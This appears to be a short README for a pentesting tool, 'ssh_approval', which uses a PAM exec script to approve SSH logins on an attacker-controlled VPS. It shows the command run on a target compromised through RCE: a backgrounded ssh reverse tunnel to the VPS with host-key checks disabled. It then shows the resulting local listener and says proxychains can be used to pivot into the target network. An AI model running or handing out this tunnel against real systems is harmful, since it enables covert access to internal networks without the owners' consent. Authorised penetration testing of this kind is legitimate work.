# ssh_approval
ssh approval script via PAM exec


# For pentesting...

When no other options are available to open tunnel inside target network, but you have **RCE**


+-----------------------------------------------------------------------+  <----   +------------------------------------------------------------------------------------------------------+
| VPS                                                                   |          | Target (RCE)                                                                                         |
|                                                                       |          |                                                                                                      |
| vagrant@debian-12:~$  Access request for user  special from 10.0.2.2  |          |                                                                                                      |
| Approve this login attempt? (y/n):                                    |          | nohup ssh -o  StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null -N -R 9150 special@192.168.1.1|
|                                                                       |          |                                                                                                      |
|                                                                       |          |                                                                                                      |
+-----------------------------------------------------------------------+          +------------------------------------------------------------------------------------------------------+ 


### Result


+-----------------------------------------------------------------+
| VPS                                                             |
|                                                                 |
| vagrant@debian-12:~$ netstat -tunap                             |
|                                                                 |
|                                                                 |
|                                                                 |
| Active Internet connections (servers and established)           |
|                                                                 |
| Proto Recv-Q Send-Q Local Address    Foreign Address            |
| **tcp   0      0   127.0.0.1:9150     0.0.0.0:\* LISTEN**            |
|                                                                 |
+-----------------------------------------------------------------+

Now you can use proxychains on the local VPS to access Target network.

